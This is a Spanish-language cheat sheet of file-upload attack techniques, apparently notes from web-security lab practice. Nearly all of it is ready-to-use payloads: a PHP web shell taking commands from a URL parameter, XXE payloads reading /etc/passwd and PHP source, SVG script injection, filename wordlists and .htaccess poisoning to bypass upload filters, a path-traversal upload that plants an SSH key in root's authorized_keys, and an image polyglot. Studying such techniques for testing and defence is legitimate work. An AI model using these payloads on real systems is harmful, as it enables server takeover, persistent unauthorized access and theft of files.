#### Shells php útiles:

        <?php system($_GET['cmd']); ?>
        <?php echo file_get_contents('/home/carlos/secret'); ?>




#### Generar bash con wordlists para bypassear whitelists:

        for char in '%20' '%0a' '%00' '%0d0a' '/' '.\\' '.' '…' ':'; do
            for ext in '.php' '.phps' '.phtml' '.phar' '.php3' '.phtm'; do
                echo "shell$char$ext.jpg" >> wordlist.txt
                echo "shell$ext$char.jpg" >> wordlist.txt
                echo "shell.jpg$char$ext" >> wordlist.txt
                echo "shell.jpg$ext$char" >> wordlist.txt
            done
        done


#### Siempre agregar, previo al código malicioso un "tipo de archivo" en base a los magicnumbers:
        "
        GIFF8
        <?php .... ?>

#### XSS:

Añadir código malicioso en la metadata de los archivos.
sgv example:

        <svg xmlns="http://www.w3.org/2000/svg" version="1.1" width="1" height="1">
            <rect x="1" y="1" width="1" height="1" fill="green" stroke="black" />
            <script type="text/javascript">alert(window.origin);</script>
        </svg>


#### XXE:

leer un archivo en el servidor

        <?xml version="1.0" encoding="UTF-8"?>
        <!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
        <svg>&xxe;</svg>

#### Ver código fuente de un archivo php:

        <?xml version="1.0" encoding="UTF-8"?>
        <!DOCTYPE svg [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php"> ]>
        <svg>&xxe;</svg>


### File upload wth path transversal:
Podemos encontrarnos con que en algunos casos logramos subir un archivo malicioso, pero al momento de ejecutarlo en 
el servidor, este está impedido de ejecutarse mostrandonos el texto plano (si lo escondimos en una foto podríamos
intentar ejecutarla y que nada pase).
Esto se debe a que algunos servidores limitan la ejecución de código en directorios puntuales.
Para esto podemos combinar el path transversal agregándolo en la cabecera Content-Disposition:

###### Content-Disposition: form-data; name="avatar"; filename="../exploit.php" (debemos seguir todos los procedimientos de evación de filtros de path transversal si es que el servidor tiene alguna validación).
Luego, con el mismo path transversal podemos llamarlo. (puede que al momento de llamarlo, si debimos encodear el path}
transversal en la subida, no debamos encodearlo en la ejecución).

### RSA implant

Si contamos con path transversal en el upload podríamos crear una rsa key e implantarsela a un usuario.

        ssh-keygen -t rsa


Luego metemos el .pub en el archivo uthorized_keys

        cat pop.pub > authorized_keys 

Luego subimos el archivo aprovechando el path transversal hasta una carpeta de un usuario. Ej:

        ../../../../../../../root/.ssh/authorized_keys

Luego nos logueamos por ssh con la rsa_id

#### Blacklist bypass:
Fuerza bruta de extensión:
Si nos encontramos un filtro de blacklist, podemos hacer fuerza bruta sobre la extención del archivo malicioso buscando una extención permitida.

#### .htaccess poisoning/spoofing:

Podemos encontrarnos que no hay una extensión permitida dentro de las shells que necesitamos o que, aunque hubiera alguna, no hubiera permisos de ejecución. 
Podemos subir un archivo .htaccess envenenado que nos permita la ejecucion:

##### 1)creamos un archivo .htaccess y lo subimos:

        echo "AddType application/x-httpd-php .dork" > .htaccess

##### 2)Subimos nuevamente la shell con la extensión ".dork" y ejecutamos.

#### Recursión de extensiones:

Podemos también, si hay un filtro que busque por palabras puntuales y las elimine, sumar recursión a la extensión de
los archivos: shell.p.phphp

#### Polyglot php en una imagen:

        exiftool -Comment="<?php echo 'START ' . file_get_contents('/home/carlos/secret') . ' END'; ?>" <YOUR-INPUT-IMAGE>.jpg -o polyglot.php






